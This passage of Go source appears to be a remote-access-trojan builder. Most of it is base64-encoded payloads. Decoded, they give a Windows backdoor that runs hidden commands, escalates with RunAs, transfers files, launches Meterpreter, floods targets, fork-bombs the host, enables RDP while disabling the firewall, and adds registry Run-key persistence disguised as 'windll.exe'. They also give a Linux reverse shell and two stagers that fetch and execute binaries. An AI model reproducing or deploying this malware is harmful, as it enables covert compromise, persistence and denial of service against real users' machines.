CAgICAgICAgICAgICAKICAgICAgfTsKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICLCo3BsZWFzZSIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICLCo1BMRUFTRSIpIHsgCiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKFNBWV9QTEVBU0UoKSkpOwogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIsKjZG93bmxvYWQiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAiwqNET1dOTE9BRCIpIHsgCiAgICAgIGdvIERPV05MT0FEX1ZJQV9UQ1AoKTsKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICLCo3VwbG9hZCAtZiIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICLCo1VQTE9BRCAtRiAiKSB7CiAgICAgIGdvIFVQTE9BRF9WSUFfVENQKCk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAiwqNNRVRFUlBSRVRFUiAtQyIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICLCo21ldGVycHJldGVyIC1jIikgeyAKICAgICAgTUVURVJQUkVURVJfQ1JFQVRFKCk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICLCo0RPUyIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICLCo2RvcyIpIHsKICAgICAgRE9TX0NvbW1hbmQgOj0gc3RyaW5ncy5TcGxpdChHbG9iYWxfX0NvbW1hbmQsICJcIiIpCiAgICAgIERPU19UYXJnZXQgPSAgRE9TX0NvbW1hbmRbMV0KICAgICAgZ28gRE9TKCk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICLCo0RJU1RSQUNUIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIsKjZGlzdHJhY3QiKSB7IAogICAgICBESVNUUkFDVCgpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAiwqNERVNLVE9QIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIsKjZGVza3RvcCIpIHsgCiAgICAgIFN0YXR1cyA6PSBSRU1PVEVfREVTS1RPUCgpCiAgICAgIGlmIFN0YXR1cyA9PSBmYWxzZSB7CiAgICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlstXSBmYWlsZWQgwqM+IikpCiAgICAgIH1lbHNlewogICAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJbK10gc3VjY2VzcyDCoz4iKSkKICAgICAgfSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIsKjUEVSU0lTVEVOQ0UiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAiwqNwZXJzaXN0ZW5jZSIpIHsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgIGdvIFBFUlNJU1QoKTsKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoc3RyaW5nKCJcblxuWypdIEFkZGluZyBwZXJzaXN0ZW5jZSByZWdpc3RyaWVzLi4uXG5bKl0gUGVyc2lzdGVuY2UgQ29tcGxldGVkXG5cbiDCoz4gIikpKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH1lbHNlewogICAgICBjbWQgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBfQ29tbWFuZCk7CiAgICAgIGNtZC5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogICAgICBvdXQsIF8gOj0gY21kLk91dHB1dCgpOwogICAgICBDb21tYW5kX091dHB1dCA6PSBzdHJpbmcoc3RyaW5nKG91dCkrIiDCoz4gIik7CiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKENvbW1hbmRfT3V0cHV0KSk7CiAgICB9OwogIH07Cn07CgoKCgpmdW5jIFVQTE9BRF9WSUFfR0VUKCkgewogIGZvciB7CiAgICBkb3dubG9hZF91cmwgOj0gc3RyaW5ncy5TcGxpdChHbG9iYWxfX0NvbW1hbmQsICJcIiIpOwogICAgcmVzcG9uc2UsIGVyciA6PSBodHRwLkdldChkb3dubG9hZF91cmxbMV0pOwogICAgaWYgZXJyICE9IG5pbCB7CiAgICAgIGZpbGVfdHJhbnNmZXJfc3VjY2VzID0gZmFsc2U7CiAgICAgIGJyZWFrOwogICAgfTsKICAgIGRlZmVyIHJlc3BvbnNlLkJvZHkuQ2xvc2UoKTsKICAgIGJvZHksIF8gOj0gaW91dGlsLlJlYWRBbGwocmVzcG9uc2UuQm9keSk7CiAgICBmaWxlLCBfIDo9IG9zLkNyZWF0ZSgid2luZGxsX3VwbG9hZC5leGUiKTsKICAgIGZpbGUuV3JpdGVTdHJpbmcoc3RyaW5nKGJvZHkpKTsKICAgIGZpbGVfdHJhbnNmZXJfc3VjY2VzID0gdHJ1ZTsKICAgIHJ1bnRpbWUuR0MoKTsKICAgIGN1c3RvbV9jb21tYW5kIDo9ICgibW92ZSB3aW5kbGxfdXBsb2FkLmV4ZSAiKyIlIisiYXBwZGF0YSIrIiUiKTsKICAgIGNtZCA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsIGN1c3RvbV9jb21tYW5kKTsKICAgIGNtZC5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogICAgY21kLlJ1bigpOwogICAgYnJlYWs7CiAgfTsKfTsKCgoKZnVuYyBQRVJTSVNUKCkgewoKICBQRVJTSVNULCBfIDo9IG9zLkNyZWF0ZSgiUEVSU0lTVC5iYXQiKQoKICBQRVJTSVNULldyaXRlU3RyaW5nKCJta2RpciAlQVBQREFUQSVcXFdpbmRvd3MiKyJcbiIpCiAgUEVSU0lTVC5Xcml0ZVN0cmluZygiY29weSAiICsgb3MuQXJnc1swXSArICIgJUFQUERBVEElXFxXaW5kb3dzXFx3aW5kbGwuZXhlXG4iKQogIFBFUlNJU1QuV3JpdGVTdHJpbmcoIlJFRyBBREQgSEtDVVxcU09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFJ1biAvViBXaW5EbGwgL3QgUkVHX1NaIC9GIC9EICVBUFBEQVRBJVxcV2luZG93c1xcd2luZGxsLmV4ZSIpCgogIFBFUlNJU1QuQ2xvc2UoKQoKICBFeGVjIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgIlBFUlNJU1QuYmF0Iik7CiAgRXhlYy5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogIEV4ZWMuUnVuKCk7CiAgQ2xlYW4gOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCAiZGVsIFBFUlNJU1QuYmF0Iik7CiAgQ2xlYW4uU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICBDbGVhbi5SdW4oKTsKfTsKCgpmdW5jIE1FVEVSUFJFVEVSX0NSRUFURSgpIHsKICBpZiBzdHJpbmdzLkNvbnRhaW5zKEdsb2JhbF9fQ29tbWFuZCwgIi1jIikgewogICAgUEFZTE9BRCwgXyA6PSBvcy5DcmVhdGUoIndpbmRsbC5iYXQiKQogICAgUEFZTE9BRF9DT0RFIDo9IHN0cmluZ3MuU3BsaXQoR2xvYmFsX19Db21tYW5kLCAiLWMiKQogICAgUEFZTE9BRC5Xcml0ZVN0cmluZyhzdHJpbmcoUEFZTE9BRF9DT0RFWzFdKSkKICAgIHJ1bnRpbWUuR0MoKQogICAgY3VzdG9tX2NvbW1hbmQgOj0gKCJtb3ZlIHdpbmRsbC5iYXQgIiArICIlIiArICJhcHBkYXRhIisiJSIpOwogICAgY21kIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgY3VzdG9tX2NvbW1hbmQpOwogICAgY21kLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgICBjbWQuUnVuKCk7CiAgICBydW50aW1lLkdDKCk7CiAgICBjdXN0b21fY29tbWFuZCA9ICgiJSIrImFwcGRhdGEiKyIlIisiL3dpbmRsbC5iYXQiKTsKICAgIGNtZCA9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgY3VzdG9tX2NvbW1hbmQpOwogICAgY21kLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgICBjbWQuUnVuKCk7CiAgICBjbWQgPSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsICJ3aW5kbGwuYmF0Iik7CiAgICBjbWQuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICAgIGNtZC5SdW4oKTsKICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKEdsb2JhbF9fQ29tbWFuZCwgIi1DIikgewogICAgUEFZTE9BRCwgXyA6PSBvcy5DcmVhdGUoIndpbmRsbC5iYXQiKQogICAgUEFZTE9BRF9DT0RFIDo9IHN0cmluZ3MuU3BsaXQoR2xvYmFsX19Db21tYW5kLCAiLUMiKQogICAgUEFZTE9BRC5Xcml0ZVN0cmluZyhzdHJpbmcoUEFZTE9BRF9DT0RFWzFdKSkKICAgIHJ1bnRpbWUuR0MoKQogICAgY3VzdG9tX2NvbW1hbmQgOj0gKCJtb3ZlIHdpbmRsbC5iYXQgIiArICIlIiArICJhcHBkYXRhIisiJSIpOwogICAgY21kIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgY3VzdG9tX2NvbW1hbmQpOwogICAgY21kLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgICBjbWQuUnVuKCk7CiAgICBydW50aW1lLkdDKCk7CiAgICBjdXN0b21fY29tbWFuZCA9ICgiJSIrImFwcGRhdGEiKyIlIisiL3dpbmRsbC5iYXQiKTsKICAgIGNtZCA9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgY3VzdG9tX2NvbW1hbmQpOwogICAgY21kLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgICBjbWQuUnVuKCk7CiAgICBjbWQgPSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsICJ3aW5kbGwuYmF0Iik7CiAgICBjbWQuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICAgIGNtZC5SdW4oKTsKICB9Cn0KCgpmdW5jIERPV05MT0FEX1ZJQV9UQ1AoKSB7CiAgZm9yIHsKICAgIGNvbm5lY3QsIGVyciA6PSBuZXQuRGlhbCgidGNwIiwgVklDVElNX0lQKyI6IisiNTU4ODgiKTsKICAgIGlmIGVyciAhPSBuaWwgewogICAgICBVUExPQURfVklBX1RDUCgpOwogICAgfTsKICAgIGZpbGVfbmFtZSA6PSBzdHJpbmdzLlNwbGl0KEdsb2JhbF9fQ29tbWFuZCwgIlwiIik7CiAgICBmaWxlLCBfIDo9IG9zLk9wZW4oZmlsZV9uYW1lWzFdKTsKICAgIGRlZmVyIGZpbGUuQ2xvc2UoKTsKICAgIGlvLkNvcHkoY29ubmVjdCwgZmlsZSk7CiAgICBjb25uZWN0LkNsb3NlKCk7CiAgICBicmVhazsKICB9Owp9OwoKCmZ1bmMgVVBMT0FEX1ZJQV9UQ1AoKSB7CiAgY29ubmVjdCwgZXJyIDo9IG5ldC5EaWFsKCJ0Y3AiLCBWSUNUSU1fSVArIjoiKyI1NTg4OCIpOwogIGlmIGVyciAhPSBuaWwgewogICAgVVBMT0FEX1ZJQV9UQ1AoKTsKICB9OwogIGZpbGVfbmFtZSA6PSBzdHJpbmdzLlNwbGl0KEdsb2JhbF9fQ29tbWFuZCwgIlwiIik7CiAgZmlsZSwgXyA6PSBvcy5DcmVhdGUoZmlsZV9uYW1lWzFdKTsKICBmaWxlX25hbWVbMV0gPSBzdHJpbmdzLlRyaW0oZmlsZV9uYW1lWzFdLCAiICIpOwogIGRlZmVyIGZpbGUuQ2xvc2UoKTsKICBpby5Db3B5KGZpbGUsIGNvbm5lY3QpOwogIGZpbGUuQ2xvc2UoKTsKICBjb25uZWN0LkNsb3NlKCk7Cn07CgoKZnVuYyBTQVlfUExFQVNFKCkgKHN0cmluZyl7CiAgQ29tbWFuZCA6PSBzdHJpbmdzLlNwbGl0KEdsb2JhbF9fQ29tbWFuZCwgIlwiIik7CiAgY21kIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgc3RyaW5nKCJwb3dlcnNoZWxsLmV4ZSAtQ29tbWFuZCBTdGFydC1Qcm9jZXNzIC1WZXJiIFJ1bkFzICIrc3RyaW5nKENvbW1hbmRbMV0pKSk7CiAgY21kLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgb3V0LCBfIDo9IGNtZC5PdXRwdXQoKTsKICBDb21tYW5kX091dHB1dCA6PSBzdHJpbmcoc3RyaW5nKG91dCkrIiDCoz4gIik7CiAgcmV0dXJuIENvbW1hbmRfT3V0cHV0Owp9OwoKCgpmdW5jIFJFTU9URV9ERVNLVE9QKCkgKGJvb2wpIHsKCiAgdmFyIFN0YXR1cyBib29sID0gdHJ1ZTsKICBFbmFibGVfUkQgOj0gInJlZyBhZGQgXCJoa2xtXFxzeXN0ZW1cXGN1cnJlbnRDb250cm9sU2V0XFxDb250cm9sXFxUZXJtaW5hbCBTZXJ2ZXJcIiAvdiBcIkFsbG93VFNDb25uZWN0aW9uc1wiIC90IFJFR19EV09SRCAvZCAweDEgL2YiOwogIEVuYWJsZV9SRF8yIDo9ICJyZWcgYWRkIFwiaGtsbVxcc3lzdGVtXFxjdXJyZW50Q29udHJvbFNldFxcQ29udHJvbFxcVGVybWluYWwgU2VydmVyXCIgL3YgXCJmRGVueVRTQ29ubmVjdGlvbnNcIiAvdCBSRUdfRFdPUkQgL2QgMHgwIC9mIjsKICBydW50aW1lLkdDKCk7CiAgRV9SRCA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsIHN0cmluZyhFbmFibGVfUkQpKTsKICBFX1JELlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgRV9SRC5SdW4oKTsKICBydW50aW1lLkdDKCk7CiAgRV9SRF8yIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgc3RyaW5nKEVuYWJsZV9SRF8yKSk7CiAgRV9SRF8yLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgRV9SRF8yLlJ1bigpOwogIHJ1bnRpbWUuR0MoKTsKICBTdGFydF9UZXJtU2VydmljZV8xIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgInNjIGNvbmZpZyBUZXJtU2VydmljZSBzdGFydD0gYXV0byIpOwogIFN0YXJ0X1Rlcm1TZXJ2aWNlXzEuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICBTZXJ2aWNlX091dHB1dF8xLCBfIDo9IFN0YXJ0X1Rlcm1TZXJ2aWNlXzEuT3V0cHV0KCk7CiAgaWYgc3RyaW5ncy5Db250YWlucyhzdHJpbmcoU2VydmljZV9PdXRwdXRfMSksICJkZW5pZWQuIikgewogICAgU3RhdHVzID0gZmFsc2UKICB9CiAgcnVudGltZS5HQygpOwogIFN0YXJ0X1Rlcm1TZXJ2aWNlXzIgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCAibmV0IHN0YXJ0IFRlcm1zZXJ2aWNlIik7CiAgU3RhcnRfVGVybVNlcnZpY2VfMi5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogIFN0YXJ0X1Rlcm1TZXJ2aWNlXzIuUnVuKCk7CiAgcnVudGltZS5HQygpOwogIERpc2FibGVfRlcgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCAibmV0c2ggZmlyZXdhbGwgc2V0IG9wbW9kZSBkaXNhYmxlIik7CiAgRGlzYWJsZV9GVy5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogIEZXX091dHB1dCwgXyA6PSBEaXNhYmxlX0ZXLk91dHB1dCgpOwogIHJ1bnRpbWUuR0MoKTsKICBpZiBzdHJpbmdzLkNvbnRhaW5zKHN0cmluZyhGV19PdXRwdXQpLCAiKFJ1biBhcyBhZG1pbmlzdHJhdG9yKS4iKXsKICAgIFN0YXR1cyA9IGZhbHNlCiAgfQogIHJldHVybiBTdGF0dXMKfQoKCgpmdW5jIERJU1RSQUNUKCkgewogIHZhciBGb3JrX0JvbWIgc3RyaW5nID0gIjpBXG5zdGFydFxuZ290byBBIgoKICBGX0JvbWIsIF8gOj0gb3MuQ3JlYXRlKCJGX0JvbWIuYmF0IikKCiAgRl9Cb21iLldyaXRlU3RyaW5nKEZvcmtfQm9tYikKCiAgRl9Cb21iLkNsb3NlKCkKCiAgZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCAiRl9Cb21iLmJhdCIpLlN0YXJ0KCkKCn0KCgpmdW5jIERPUygpIHsKICBmb3IgewogICAgRE9TX1JlcXVlc3RfQ291bnRlcisrCiAgICByZXNwb25zZSwgXyA6PSBodHRwLkdldChET1NfVGFyZ2V0KTsKCiAgICBib2R5LCBfIDo9IGlvdXRpbC5SZWFkQWxsKHJlc3BvbnNlLkJvZHkpOwogICAgZm10LlByaW50bG4oYm9keSkKICAgIHJlc3BvbnNlLkJvZHkuQ2xvc2UoKTsKICAgIGlmIERPU19SZXF1ZXN0X0NvdW50ZXIgPCBET1NfUmVxdWVzdF9MaW1pdCB7CiAgICAgIGdvIERPUygpCiAgICB9ZWxzZXsKICAgICAgYnJlYWs7CiAgICB9IAogIH0KfQoKCmZ1bmMgRElTUEFUQ0goKSB7CiAgdmFyIEVuY29kZWRCaW5hcnkgc3RyaW5nID0gLy9JTlNFUlQtQklOQVJZLUhFUkUvLwoKCiAgQmluYXJ5LCBfIDo9IG9zLkNyZWF0ZSgid2ludXBkdC5leGUiKQoKICBEZWNvZGVkQmluYXJ5LCBfIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5EZWNvZGVTdHJpbmcoRW5jb2RlZEJpbmFyeSkKCiAgQmluYXJ5LldyaXRlU3RyaW5nKHN0cmluZyhEZWNvZGVkQmluYXJ5KSk7CgogIEJpbmFyeS5DbG9zZSgpCgogIEV4ZWMgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCAid2ludXBkdC5leGUiKTsKICBFeGVjLlN0YXJ0KCk7Cn0="

var LINUX_PAYLOAD string = "CnBhY2thZ2UgbWFpbgoKCiAKaW1wb3J0Im9zL2V4ZWMiCmltcG9ydCJuZXQiCmltcG9ydCAidGltZSIKaW1wb3J0ICJwYXRoL2ZpbGVwYXRoIgppbXBvcnQgIm9zIgoKY29uc3QgVklDVElNX0lQIHN0cmluZyA9ICIxMjcuMC4wLjEiOwpjb25zdCBWSUNUSU1fUE9SVCBzdHJpbmcgPSAiODU1MiI7CgpmdW5jIG1haW4oKXsKICAgIGNvbm5lY3QsIGVyciA6PW5ldC5EaWFsKCJ0Y3AiLFZJQ1RJTV9JUCsiOiIrVklDVElNX1BPUlQpOwogICAgaWYgZXJyICE9IG5pbCB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICB0aW1lLlNsZWVwKDE1KnRpbWUuU2Vjb25kKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgIG1haW4oKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH07IAogICAgZGlyLCBfIDo9IGZpbGVwYXRoLkFicyhmaWxlcGF0aC5EaXIob3MuQXJnc1swXSkpOyAgICAgCiAgICB2ZXJzaW9uX2NoZWNrIDo9IGV4ZWMuQ29tbWFuZCgic2giLCAiLWMiLCAidW5hbWUgLWEiKTsKICAgIHZlcnNpb24sIF8gOj0gdmVyc2lvbl9jaGVjay5PdXRwdXQoKTsgICAgICAgICAgIAogICAgU3lzR3VpZGUgOj0gKHN0cmluZyhkaXIpICsgIiDCoz4gIiArIHN0cmluZyh2ZXJzaW9uKSArICIgwqM+ICIpOyAgIAogICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoc3RyaW5nKFN5c0d1aWRlKSkpCiAgICBjbWQ6PWV4ZWMuQ29tbWFuZCgiL2Jpbi9zaCIpOwogICAgY21kLlN0ZGluPWNvbm5lY3Q7CiAgICBjbWQuU3Rkb3V0PWNvbm5lY3Q7CiAgICBjbWQuU3RkZXJyPWNvbm5lY3Q7CiAgICBjbWQuUnVuKCk7Cn0="


var WIN_STAGER_PAYLOAD string = "CgpwYWNrYWdlIG1haW4KCgppbXBvcnQgIm9zIgppbXBvcnQgIm5ldCIKaW1wb3J0ICJ0aW1lIgppbXBvcnQgImlvIgppbXBvcnQgIm9zL2V4ZWMiCmltcG9ydCAicnVudGltZSIKaW1wb3J0ICJzeXNjYWxsIgoKY29uc3QgVklDVElNX0lQID0gIjEyNy4wLjAuMSI7CmNvbnN0IFZJQ1RJTV9QT1JUID0gIjg1NTIiOwoKZnVuYyBtYWluKCkgewogIAogIENvbm5lY3QsIGVyciA6PSBuZXQuRGlhbCgidGNwIiwgVklDVElNX0lQKyI6IitWSUNUSU1fUE9SVCk7CiAgaWYgZXJyICE9IG5pbCB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgdGltZS5TbGVlcCg1KnRpbWUuU2Vjb25kKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICBtYWluKCk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgfTsKICBmaWxlLCBfIDo9IG9zLkNyZWF0ZSgid2luZGxsLmV4ZSIpOwogIGlvLkNvcHkoZmlsZSwgQ29ubmVjdCk7CiAgcnVudGltZS5HQygpCiAgTW92ZV9TdHJpbmcgOj0gc3RyaW5nKCJtb3ZlIHdpbmRsbC5leGUgIisiJSIrImFwcGRhdGEiKyIlIikKICBNb3ZlIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgTW92ZV9TdHJpbmcpOwogIE1vdmUuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICBNb3ZlLlJ1bigpCiAgRXhlY3V0ZV9TdHJpbmcgOj0gc3RyaW5nKCIlIisiYXBwZGF0YSIrIiUiKyJcXHdpbmRsbC5leGUiKQogIEV4ZWN1dGUgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBFeGVjdXRlX1N0cmluZyk7CiAgRXhlY3V0ZS5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogIEV4ZWN1dGUuUnVuKCkKfQ=="


var LINUX_STAGER_PAYLOAD string = "CgpwYWNrYWdlIG1haW4KCgppbXBvcnQgIm9zIgppbXBvcnQgIm5ldCIKaW1wb3J0ICJ0aW1lIgppbXBvcnQgImlvIgppbXBvcnQgIm9zL2V4ZWMiCmltcG9ydCAicnVudGltZSIKaW1wb3J0ICJzeXNjYWxsIgoKY29uc3QgVklDVElNX0lQID0gIjEyNy4wLjAuMSI7CmNvbnN0IFZJQ1RJTV9QT1JUID0gIjg1NTIiOwoKZnVuYyBtYWluKCkgewogIAogIENvbm5lY3QsIGVyciA6PSBuZXQuRGlhbCgidGNwIiwgVklDVElNX0lQKyI6IitWSUNUSU1fUE9SVCk7CiAgaWYgZXJyICE9IG5pbCB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgdGltZS5TbGVlcCg1KnRpbWUuU2Vjb25kKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICBtYWluKCk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgfTsKICBmaWxlLCBfIDo9IG9zLkNyZWF0ZSgibGludXhsaWIiKTsKICBpby5Db3B5KGZpbGUsIENvbm5lY3QpOwogIHJ1bnRpbWUuR0MoKQogIGV4ZWMuQ29tbWFuZCgic2giLCAiLWMiLCAiY2htb2QgNzc3IGxpbnV4bGliIikKICBFeGVjdXRlIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgLi9saW51eGxpYik7CiAgRXhlY3V0ZS5SdW4oKQp9"
